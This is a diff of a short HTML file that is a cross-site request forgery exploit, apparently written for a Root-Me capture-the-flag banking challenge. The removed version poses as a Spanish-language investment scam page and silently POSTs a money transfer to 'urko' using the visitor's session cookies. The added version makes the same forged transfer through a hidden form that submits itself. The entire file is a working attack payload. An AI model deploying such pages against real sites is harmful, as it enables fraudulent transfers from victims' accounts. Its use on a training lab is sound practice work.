@@ -1,19 +1,16 @@
+<!DOCTYPE html>
 <html>
-  <body>
-    <h2>🚀 Inversión Exclusiva 🚀</h2>
-    <p>¡Gana dinero automáticamente con nuestra plataforma premium!</p>
-
-    <script>
-      fetch("https://bankme-1.challenges.pro.root-me.org/transfer", {
-        method: "POST",
-        credentials: "include",  // Envía cookies de sesión
-        headers: { 
-          "Content-Type": "application/x-www-form-urlencoded",
-          "Referer": "https://bankme-1.challenges.pro.root-me.org/profile"
-        },
-        body: "to=urko&amount=9999999"
-      }).then(response => response.text())
-        .then(data => console.log("Respuesta del servidor:", data));
-    </script>
-  </body>
+<head>
+<title>CSRF Exploit</title>
+</head>
+<body>
+<form id="csrfForm" action="https://bankme-1.challenges.pro.root-me.org/transfer" method="POST">
+<input type="hidden" name="recipient" value="urko">
+<input type="hidden" name="amount" value="1000000">
+</form>
+<script>
+        // Enviar el formulario automáticamente
+        document.getElementById('csrfForm').submit();
+</script>
+</body>
 </html>
